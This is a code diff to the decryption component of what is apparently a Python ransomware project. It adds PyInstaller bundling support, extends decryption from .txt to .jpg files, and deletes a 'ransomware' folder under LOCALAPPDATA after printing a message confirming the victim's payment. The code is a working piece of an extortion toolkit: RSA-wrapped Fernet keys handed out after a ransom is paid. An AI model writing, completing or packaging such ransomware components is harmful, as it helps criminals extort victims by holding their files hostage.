@@ -1,17 +1,21 @@
-import os
-import base64
+import os, sys, base64
+from shutil import rmtree
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.backends import default_backend 
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.fernet import Fernet
 
+def get_filestr(filestring: str) -> str:
+    if getattr(sys, 'frozen', False):
+        filestring = os.path.join(sys._MEIPASS, filestring)
+    return filestring
 
 def decrypt(ciphertext: bytes, key: Fernet) -> None:
     return key.decrypt(ciphertext)
 
 def decrypt_key(path: str) -> bytes:
-    with open("private_key.pem", "rb") as key_file:
+    with open(get_filestr("private_key.pem"), "rb") as key_file:
         with open(path, "rb") as keyfile:
             private_key = serialization.load_pem_private_key(
                 key_file.read(),
@@ -39,11 +43,12 @@ def decryption():
     key = Fernet(read_key())
     files = os.listdir()
     for file in files:
-        if file.endswith(".txt"):
+        if file.endswith(".txt") or file.endswith(".jpg"):
             with open(file,"rb") as f:
                 encrypted = f.read()
             with open(file,"wb") as f:
                 f.write(decrypt(encrypted, key))
+    rmtree(os.path.join(os.getenv("LOCALAPPDATA"), "ransomware"))
 
 try:
     print("We have received your payment. We will begin decryption of your files.")
